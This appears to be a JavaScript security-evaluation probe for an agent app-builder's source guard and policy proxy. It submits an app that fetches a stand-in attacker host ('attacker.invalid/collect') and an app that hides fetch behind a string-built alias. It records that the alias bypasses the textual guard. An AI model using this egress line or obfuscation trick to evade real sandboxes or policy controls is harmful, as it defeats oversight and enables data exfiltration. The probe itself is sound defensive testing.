import { json, budgetSignal } from './fixtures.mjs';
export async function securityProbes(env) {
  await env.seed('description');
  const token = process.env.EVAL_AUTH_TOKEN ?? env.token;
  const project = await json(env.agentUrl + '/projects', { name: 'Evaluation security negative controls', apiIds: ['employees', 'refunds'] }, token);
  async function saveSource(source) {
    const response = await fetch(env.agentUrl + `/projects/${project.projectId}/source`, { signal: budgetSignal(), method: 'PUT', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ baseRevision: project.revision, files: { ...project.files, '/src/App.tsx': source } }) });
    return response.status;
  }
  const rawFetchStatus = await saveSource("export default function App(){ fetch('https://attacker.invalid/collect'); return null }");
  const computedAliasStatus = await saveSource("export default function App(){ const network = globalThis['fet'+'ch']; return <button onClick={()=>network('/unregistered')}>test</button> }");
  const host = await env.preview(project, false), cfg = host.toiFetch;
  const headers = { Authorization: `Bearer ${cfg.sessionToken}`, 'X-Toi-Project': project.projectId, 'X-Toi-Capability': cfg.capabilityToken, 'X-Toi-Reason': 'security evaluation' };
  const noCapability = await fetch(env.policyUrl + '/proxy/employees/employees', { signal: budgetSignal(), headers: { Authorization: headers.Authorization, 'X-Toi-Project': project.projectId } });
  const unregistered = await fetch(env.policyUrl + '/proxy/not_registered/employees', { signal: budgetSignal(), headers });
  const writeWithRead = await fetch(env.policyUrl + '/proxy/refunds/refunds/R001', { signal: budgetSignal(), method: 'PATCH', headers: { ...headers, 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'approved' }) });
  const missingReason = await fetch(env.policyUrl + '/proxy/employees/employees', { signal: budgetSignal(), headers: { Authorization: headers.Authorization, 'X-Toi-Project': project.projectId, 'X-Toi-Capability': cfg.capabilityToken } });
  return { rawFetchSourceRejected: rawFetchStatus === 400, rawFetchStatus, computedAliasSourceAccepted: computedAliasStatus === 200,
    noCapabilityDenied: !noCapability.ok, noCapabilityStatus: noCapability.status, unregisteredDenied: !unregistered.ok, unregisteredStatus: unregistered.status,
    readCapabilityWriteDenied: writeWithRead.status === 403, missingReasonDenied: missingReason.status === 428,
    finding: computedAliasStatus === 200 ? 'Source guard accepts computed global fetch alias and relative URL. This is a textual-guard bypass; policy proxy still protects requests sent through it, but cannot govern direct browser egress. No external request was executed by this probe; browser harness blocks and records attempted egress, so it does not prove production CSP containment.' : undefined };
}
